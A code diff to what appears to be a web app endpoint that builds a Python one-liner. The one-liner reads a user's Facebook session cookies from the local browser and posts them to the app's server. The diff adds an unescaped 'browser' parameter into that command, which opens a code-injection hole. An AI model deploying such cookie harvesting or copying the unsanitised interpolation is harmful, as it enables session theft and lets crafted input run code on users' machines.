@@ -744,14 +744,15 @@ async def capture_script(request: Request, browser: str = "auto"):
 
 
 @app.get("/api/auth/capture-command")
-async def capture_command(request: Request):
+async def capture_command(request: Request, browser: str = "auto"):
     """Return a ready-to-run Python one-liner for local cookie capture."""
     base = str(request.base_url).rstrip("/")
     cmd = (
         f"python3 -c \""
         f"import json,urllib.request as r;"
         f"import browser_cookie3 as b;"
-        f"cj=list(b.load(domain_name='.facebook.com'));"
+        f"fn=getattr(b,'{browser}',b.load);"
+        f"cj=list(fn(domain_name='.facebook.com'));"
         f"cookies=[{{'name':c.name,'value':c.value,'domain':c.domain,'path':c.path,'secure':c.secure,'httpOnly':False,'sameSite':'None'}} for c in cj if c.value];"
         f"data=json.dumps({{'cookies':cookies}}).encode();"
         f"req=r.Request('{base}/api/auth/receive-cookies',data=data,headers={{'Content-Type':'application/json'}});"
